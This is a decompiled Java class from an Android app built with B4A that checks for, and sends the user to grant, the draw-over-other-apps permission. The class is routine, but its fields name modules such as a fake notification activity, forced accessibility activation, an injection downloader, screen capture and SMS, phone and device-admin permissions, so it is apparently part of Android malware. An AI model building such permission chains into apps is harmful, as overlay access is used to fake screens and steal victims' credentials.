package com.com.androidrr;

import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.B4AClass;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.phone.Phone;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;
import java.lang.reflect.Method;
import java.util.HashMap;

/* loaded from: classes.dex */
public class requestdrawoverpermission extends B4AClass.ImplB4AClass implements BA.SubDelegator {
    private static HashMap<String, Method> htSubs;
    public Common __c = null;
    public Object _ion = null;
    public Phone _phone = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    public void _ion_event(String str, Object[] objArr) throws Exception {
    }

    private void innerInitialize(BA BA) throws Exception {
        if (this.f268ba == null) {
            this.f268ba = new BA(BA, this, htSubs, "com.com.androidrr.requestdrawoverpermission");
            if (htSubs == null) {
                this.f268ba.loadHtSubs(getClass());
                htSubs = this.f268ba.htSubs;
            }
        }
        if (BA.isShellModeRuntimeCheck(this.f268ba)) {
            getClass().getMethod("_class_globals", requestdrawoverpermission.class).invoke(this, null);
        } else {
            this.f268ba.raiseEvent2(null, true, "class_globals", false, new Object[0]);
        }
    }

    public String _class_globals() throws Exception {
        this._ion = new Object();
        this._phone = new Phone();
        return "";
    }

    public Object _getba() throws Exception {
        new JavaObject();
        return ((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), this)).RunMethod("getBA", (Object[]) Common.Null);
    }

    public Common.ResumableSubWrapper _getpermission() throws Exception {
        ResumableSub_GetPermission resumableSub_GetPermission = new ResumableSub_GetPermission(this);
        resumableSub_GetPermission.resume(this.f268ba, null);
        return (Common.ResumableSubWrapper) AbsObjectWrapper.ConvertToWrapper(new Common.ResumableSubWrapper(), resumableSub_GetPermission);
    }

    public static class ResumableSub_GetPermission extends BA.ResumableSub {
        requestdrawoverpermission parent;
        JavaObject _settings = null;
        JavaObject _ctxt = null;

        /* renamed from: _i */
        IntentWrapper f366_i = null;
        String _methodname = "";
        Object[] _args = null;

        public ResumableSub_GetPermission(requestdrawoverpermission requestdrawoverpermissionVar) {
            this.parent = requestdrawoverpermissionVar;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA BA, Object[] objArr) throws Exception {
            while (true) {
                switch (this.state) {
                    case -1:
                        Common common = this.parent.__c;
                        Common.ReturnFromResumableSub(this, null);
                        return;
                    case 0:
                        this.state = 1;
                        break;
                    case 1:
                        this.state = 10;
                        Phone phone = this.parent._phone;
                        if (Phone.getSdkVersion() >= 23) {
                            this.state = 3;
                            break;
                        } else {
                            this.state = 9;
                            break;
                        }
                    case 3:
                        this.state = 4;
                        JavaObject javaObject = new JavaObject();
                        this._settings = javaObject;
                        javaObject.InitializeStatic("android.provider.Settings");
                        JavaObject javaObject2 = new JavaObject();
                        this._ctxt = javaObject2;
                        javaObject2.InitializeContext(BA);
                        break;
                    case 4:
                        this.state = 7;
                        Object RunMethod = this._settings.RunMethod("canDrawOverlays", new Object[]{this._ctxt.getObject()});
                        Common common2 = this.parent.__c;
                        if (!RunMethod.equals(true)) {
                            break;
                        } else {
                            this.state = 6;
                            break;
                        }
                    case 6:
                        this.state = 7;
                        Common common3 = this.parent.__c;
                        Common common4 = this.parent.__c;
                        Common.ReturnFromResumableSub(this, true);
                        return;
                    case 7:
                        this.state = 10;
                        IntentWrapper intentWrapper = new IntentWrapper();
                        this.f366_i = intentWrapper;
                        StringBuilder sb = new StringBuilder();
                        sb.append("package:");
                        Common common5 = this.parent.__c;
                        B4AApplication b4AApplication = Common.Application;
                        sb.append(B4AApplication.getPackageName());
                        intentWrapper.Initialize("android.settings.action.MANAGE_OVERLAY_PERMISSION", sb.toString());
                        this.parent._startactivityforresult(this.f366_i);
                        Common common6 = this.parent.__c;
                        Common.WaitFor("ion_event", BA, this, null);
                        this.state = 11;
                        return;
                    case 9:
                        this.state = 10;
                        Common common7 = this.parent.__c;
                        Common common8 = this.parent.__c;
                        Common.ReturnFromResumableSub(this, true);
                        return;
                    case 10:
                        this.state = -1;
                        break;
                    case 11:
                        this.state = 10;
                        this._methodname = (String) objArr[0];
                        this._args = (Object[]) objArr[1];
                        Common common9 = this.parent.__c;
                        Common.ReturnFromResumableSub(this, this._settings.RunMethod("canDrawOverlays", new Object[]{this._ctxt.getObject()}));
                        return;
                }
            }
        }
    }

    public String _initialize(BA BA) throws Exception {
        innerInitialize(BA);
        return "";
    }

    public String _startactivityforresult(IntentWrapper intentWrapper) throws Exception {
        new JavaObject();
        JavaObject javaObject = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), _getba());
        Object CreateEvent = javaObject.CreateEvent(this.f268ba, "anywheresoftware.b4a.IOnActivityResult", "ion", Common.Null);
        this._ion = CreateEvent;
        javaObject.RunMethod("startActivityForResult", new Object[]{CreateEvent, intentWrapper.getObject()});
        return "";
    }

    @Override // anywheresoftware.b4a.BA.SubDelegator
    public Object callSub(String str, Object obj, Object[] objArr) throws Exception {
        BA.senderHolder.set(obj);
        return BA.SubDelegator.SubNotFound;
    }
}
